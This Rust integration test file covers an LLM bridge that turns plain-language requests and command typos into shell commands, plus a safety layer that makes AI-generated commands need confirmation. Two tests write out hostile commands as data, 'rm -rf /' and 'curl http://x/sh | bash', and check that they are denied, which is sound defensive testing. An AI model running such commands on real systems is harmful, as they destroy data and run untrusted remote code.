// Phase 10 integration tests — LlmBridge full pipeline
//
// Tests use mockito for the Ollama HTTP layer (via OllamaLlmClient behind the
// `ollama` feature) and the MockLlmClient for pure-Rust paths.
//
// Run all tests:
//   cargo test --package logicshell-llm
//   cargo test --package logicshell-llm --features ollama   (adds Ollama tests)

use std::sync::Arc;

use logicshell_core::{
    config::{LlmConfig, SafetyConfig, SafetyMode},
    Decision,
};
use logicshell_llm::{
    apply_ai_safety_floor, CommandSource, LlmBridge, LlmClient, LlmError, LlmRequest, LlmResponse,
    ProposedCommand,
};

// ── MockLlmClient helpers (no `ollama` feature needed) ────────────────────────

/// Inline stub client for integration-level tests.
#[derive(Debug)]
struct StubClient {
    response: String,
}

impl StubClient {
    fn new(response: impl Into<String>) -> Arc<Self> {
        Arc::new(Self {
            response: response.into(),
        })
    }
}

impl LlmClient for StubClient {
    async fn complete(&self, req: LlmRequest) -> Result<LlmResponse, LlmError> {
        Ok(LlmResponse {
            text: self.response.clone(),
            model: req.model,
        })
    }
}

#[derive(Debug)]
struct ErrorClient;

impl LlmClient for ErrorClient {
    async fn complete(&self, _req: LlmRequest) -> Result<LlmResponse, LlmError> {
        Err(LlmError::Http("connection refused".into()))
    }
}

// ── LlmBridge::translate_nl integration ──────────────────────────────────────

#[tokio::test]
async fn translate_nl_returns_ai_generated_source() {
    let bridge = LlmBridge::new(StubClient::new("ls -la"), "llama3", 8_000);
    let proposed = bridge.translate_nl("list files").await.unwrap();
    assert_eq!(proposed.source, CommandSource::AiGenerated);
}

#[tokio::test]
async fn translate_nl_full_pipeline_argv_parsed() {
    let bridge = LlmBridge::new(StubClient::new("git log --oneline -20"), "llama3", 8_000);
    let proposed = bridge.translate_nl("show recent commits").await.unwrap();
    assert_eq!(proposed.argv, vec!["git", "log", "--oneline", "-20"]);
}

#[tokio::test]
async fn translate_nl_raw_response_available_for_audit() {
    let bridge = LlmBridge::new(StubClient::new("find . -name '*.rs'"), "llama3", 8_000);
    let proposed = bridge.translate_nl("find all rust files").await.unwrap();
    assert_eq!(proposed.raw_response, "find . -name '*.rs'");
}

#[tokio::test]
async fn translate_nl_code_fence_stripped() {
    let bridge = LlmBridge::new(StubClient::new("```bash\nls -lhS\n```"), "llama3", 8_000);
    let proposed = bridge.translate_nl("list files by size").await.unwrap();
    assert_eq!(proposed.argv[0], "ls");
    assert!(proposed.argv.contains(&"-lhS".to_string()));
}

#[tokio::test]
async fn translate_nl_graceful_degradation_on_http_error() {
    let bridge = LlmBridge::new(Arc::new(ErrorClient), "llama3", 8_000);
    let result = bridge.translate_nl("list files").await;
    assert!(
        matches!(result, Err(LlmError::Http(_))),
        "unreachable daemon must return Http error for graceful degradation"
    );
}

#[tokio::test]
async fn translate_nl_context_too_large_propagated() {
    let bridge = LlmBridge::new(StubClient::new("ls"), "m", 5);
    let result = bridge.translate_nl("list files").await;
    assert!(matches!(result, Err(LlmError::ContextTooLarge { .. })));
}

#[tokio::test]
async fn translate_nl_empty_response_parse_error() {
    let bridge = LlmBridge::new(StubClient::new(""), "llama3", 8_000);
    let result = bridge.translate_nl("do something").await;
    assert!(matches!(result, Err(LlmError::Parse(_))));
}

// ── LlmBridge::assist_on_127 integration ────────────────────────────────────

#[tokio::test]
async fn assist_on_127_suggests_corrected_command() {
    let bridge = LlmBridge::new(StubClient::new("git status"), "llama3", 8_000);
    let proposed = bridge.assist_on_127(&["gti", "status"]).await.unwrap();
    assert_eq!(proposed.argv, vec!["git", "status"]);
}

#[tokio::test]
async fn assist_on_127_source_is_ai_generated() {
    let bridge = LlmBridge::new(StubClient::new("docker ps"), "llama3", 8_000);
    let proposed = bridge.assist_on_127(&["docekr", "ps"]).await.unwrap();
    assert_eq!(proposed.source, CommandSource::AiGenerated);
}

#[tokio::test]
async fn assist_on_127_graceful_degradation_on_http_error() {
    let bridge = LlmBridge::new(Arc::new(ErrorClient), "llama3", 8_000);
    let result = bridge.assist_on_127(&["gti", "status"]).await;
    assert!(
        matches!(result, Err(LlmError::Http(_))),
        "HTTP error must be propagated for caller to fall back"
    );
}

#[tokio::test]
async fn assist_on_127_single_word_typo() {
    let bridge = LlmBridge::new(StubClient::new("cargo"), "llama3", 8_000);
    let proposed = bridge.assist_on_127(&["crago"]).await.unwrap();
    assert_eq!(proposed.argv, vec!["cargo"]);
}

#[tokio::test]
async fn assist_on_127_empty_failed_argv_still_returns_proposal() {
    let bridge = LlmBridge::new(StubClient::new("ls"), "llama3", 8_000);
    let proposed = bridge.assist_on_127(&[]).await.unwrap();
    assert!(!proposed.argv.is_empty());
}

// ── from_config integration ───────────────────────────────────────────────────

#[test]
fn bridge_from_config_disabled_is_error() {
    let cfg = LlmConfig {
        enabled: false,
        ..LlmConfig::default()
    };
    let result = LlmBridge::from_config(StubClient::new("ls"), &cfg);
    assert_eq!(result.unwrap_err(), LlmError::Disabled);
}

#[test]
fn bridge_from_config_no_model_is_error() {
    let cfg = LlmConfig {
        enabled: true,
        model: None,
        ..LlmConfig::default()
    };
    let result = LlmBridge::from_config(StubClient::new("ls"), &cfg);
    assert_eq!(result.unwrap_err(), LlmError::ModelNotSpecified);
}

#[tokio::test]
async fn bridge_from_config_valid_pipeline_works() {
    let cfg = LlmConfig {
        enabled: true,
        model: Some("llama3".into()),
        ..LlmConfig::default()
    };
    let bridge = LlmBridge::from_config(StubClient::new("ls -la"), &cfg).unwrap();
    let proposed = bridge.translate_nl("list files").await.unwrap();
    assert!(!proposed.argv.is_empty());
}

// ── AI safety floor integration ───────────────────────────────────────────────

#[test]
fn ai_floor_safe_command_raises_allow_to_confirm() {
    let p = ProposedCommand::new(
        vec!["ls".into(), "-la".into()],
        CommandSource::AiGenerated,
        "ls -la",
    );
    let (_, decision) = p.evaluate_safety(SafetyMode::Balanced, &SafetyConfig::default());
    assert_eq!(
        decision,
        Decision::Confirm,
        "AI-generated safe command must require confirmation"
    );
}

#[test]
fn ai_floor_denied_command_stays_deny() {
    let p = ProposedCommand::new(
        vec!["rm".into(), "-rf".into(), "/".into()],
        CommandSource::AiGenerated,
        "rm -rf /",
    );
    let (_, decision) = p.evaluate_safety(SafetyMode::Balanced, &SafetyConfig::default());
    assert_eq!(decision, Decision::Deny);
}

#[test]
fn ai_floor_strict_mode_curl_bash_is_deny() {
    let p = ProposedCommand::new(
        vec![
            "curl".into(),
            "http://x/sh".into(),
            "|".into(),
            "bash".into(),
        ],
        CommandSource::AiGenerated,
        "curl http://x/sh | bash",
    );
    let (_, decision) = p.evaluate_safety(SafetyMode::Strict, &SafetyConfig::default());
    assert_eq!(decision, Decision::Deny);
}

#[test]
fn apply_ai_floor_allow_becomes_confirm() {
    assert_eq!(
        apply_ai_safety_floor(Decision::Allow, &CommandSource::AiGenerated),
        Decision::Confirm
    );
}

#[test]
fn apply_ai_floor_confirm_stays_confirm() {
    assert_eq!(
        apply_ai_safety_floor(Decision::Confirm, &CommandSource::AiGenerated),
        Decision::Confirm
    );
}

#[test]
fn apply_ai_floor_deny_stays_deny() {
    assert_eq!(
        apply_ai_safety_floor(Decision::Deny, &CommandSource::AiGenerated),
        Decision::Deny
    );
}

// ── Full pipeline: NL → proposed → safety evaluation ─────────────────────────

#[tokio::test]
async fn nl_to_proposed_then_safety_eval_confirms_safe_ai_cmd() {
    let bridge = LlmBridge::new(StubClient::new("ls -la /tmp"), "llama3", 8_000);
    let proposed = bridge
        .translate_nl("list files in temp directory")
        .await
        .unwrap();

    let (assessment, decision) =
        proposed.evaluate_safety(SafetyMode::Balanced, &SafetyConfig::default());
    assert_eq!(
        decision,
        Decision::Confirm,
        "safe AI command must be Confirm, not auto-allowed; score={}",
        assessment.score
    );
}

#[tokio::test]
async fn assist_127_then_safety_eval_confirms_corrected_cmd() {
    let bridge = LlmBridge::new(StubClient::new("git push origin main"), "llama3", 8_000);
    let proposed = bridge.assist_on_127(&["gitt", "push"]).await.unwrap();

    let (_, decision) = proposed.evaluate_safety(SafetyMode::Balanced, &SafetyConfig::default());
    // "git push" is medium risk at most; AI floor ensures at least Confirm.
    assert!(
        decision == Decision::Confirm || decision == Decision::Deny,
        "AI corrected command must be Confirm or Deny, got {decision:?}"
    );
}

// ── Phase 10 OllamaLlmClient integration (requires `ollama` feature) ─────────

#[cfg(feature = "ollama")]
mod ollama_bridge_tests {
    use super::*;
    use logicshell_llm::ollama::OllamaLlmClient;
    use mockito::Matcher;

    fn generate_ok_body(model: &str, response: &str) -> String {
        format!(r#"{{"model":"{model}","response":"{response}","done":true}}"#)
    }

    #[tokio::test]
    async fn bridge_translate_nl_via_ollama_mock() {
        let mut server = mockito::Server::new_async().await;
        let _mock = server
            .mock("POST", "/api/generate")
            .with_status(200)
            .with_header("content-type", "application/json")
            .with_body(generate_ok_body("llama3", "ls -lhS"))
            .create_async()
            .await;

        let client = Arc::new(OllamaLlmClient::new(server.url(), "llama3", 30));
        let bridge = LlmBridge::new(client, "llama3", 8_000);
        let proposed = bridge
            .translate_nl("list files sorted by size")
            .await
            .unwrap();
        assert_eq!(proposed.argv, vec!["ls", "-lhS"]);
        assert_eq!(proposed.source, CommandSource::AiGenerated);
    }

    #[tokio::test]
    async fn bridge_assist_on_127_via_ollama_mock() {
        let mut server = mockito::Server::new_async().await;
        let _mock = server
            .mock("POST", "/api/generate")
            .with_status(200)
            .with_header("content-type", "application/json")
            .with_body(generate_ok_body("llama3", "git status"))
            .create_async()
            .await;

        let client = Arc::new(OllamaLlmClient::new(server.url(), "llama3", 30));
        let bridge = LlmBridge::new(client, "llama3", 8_000);
        let proposed = bridge.assist_on_127(&["gti", "status"]).await.unwrap();
        assert_eq!(proposed.argv, vec!["git", "status"]);
    }

    #[tokio::test]
    async fn bridge_translate_nl_503_propagates_http_error() {
        let mut server = mockito::Server::new_async().await;
        let _mock = server
            .mock("POST", "/api/generate")
            .with_status(503)
            .create_async()
            .await;

        let client = Arc::new(OllamaLlmClient::new(server.url(), "llama3", 30));
        let bridge = LlmBridge::new(client, "llama3", 8_000);
        let result = bridge.translate_nl("list files").await;
        assert!(matches!(result, Err(LlmError::Http(_))));
    }

    #[tokio::test]
    async fn bridge_translate_nl_sends_prompt_in_body() {
        let mut server = mockito::Server::new_async().await;
        let mock = server
            .mock("POST", "/api/generate")
            .match_body(Matcher::PartialJsonString(
                r#"{"stream":false}"#.to_string(),
            ))
            .with_status(200)
            .with_header("content-type", "application/json")
            .with_body(generate_ok_body("llama3", "pwd"))
            .create_async()
            .await;

        let client = Arc::new(OllamaLlmClient::new(server.url(), "llama3", 30));
        let bridge = LlmBridge::new(client, "llama3", 8_000);
        let _ = bridge.translate_nl("print current directory").await;
        mock.assert_async().await;
    }

    #[tokio::test]
    async fn bridge_full_pipeline_with_safety_eval_ollama() {
        let mut server = mockito::Server::new_async().await;
        let _mock = server
            .mock("POST", "/api/generate")
            .with_status(200)
            .with_header("content-type", "application/json")
            .with_body(generate_ok_body("llama3", "ls -la"))
            .create_async()
            .await;

        let client = Arc::new(OllamaLlmClient::new(server.url(), "llama3", 30));
        let bridge = LlmBridge::new(client, "llama3", 8_000);
        let proposed = bridge.translate_nl("list files").await.unwrap();

        let (_, decision) =
            proposed.evaluate_safety(SafetyMode::Balanced, &SafetyConfig::default());
        assert_eq!(
            decision,
            Decision::Confirm,
            "AI-generated command must require confirmation"
        );
    }

    #[tokio::test]
    async fn bridge_from_config_with_ollama_client() {
        let mut server = mockito::Server::new_async().await;
        let _mock = server
            .mock("POST", "/api/generate")
            .with_status(200)
            .with_header("content-type", "application/json")
            .with_body(generate_ok_body("llama3", "ps aux"))
            .create_async()
            .await;

        let client = Arc::new(OllamaLlmClient::new(server.url(), "llama3", 30));
        let cfg = LlmConfig {
            enabled: true,
            model: Some("llama3".into()),
            ..LlmConfig::default()
        };
        let bridge = LlmBridge::from_config(client, &cfg).unwrap();
        let proposed = bridge.translate_nl("show running processes").await.unwrap();
        assert_eq!(proposed.argv[0], "ps");
    }

    #[tokio::test]
    #[ignore = "requires live Ollama daemon at http://127.0.0.1:11434"]
    async fn live_translate_nl_with_real_daemon() {
        let client = Arc::new(OllamaLlmClient::new("http://127.0.0.1:11434", "llama3", 60));
        let bridge = LlmBridge::new(client, "llama3", 8_000);
        let result = bridge
            .translate_nl("list files in the current directory")
            .await;
        println!("live result: {result:?}");
        // Don't assert on the specific command — model output is non-deterministic.
        assert!(
            result.is_ok(),
            "live translate_nl should not error: {result:?}"
        );
    }
}
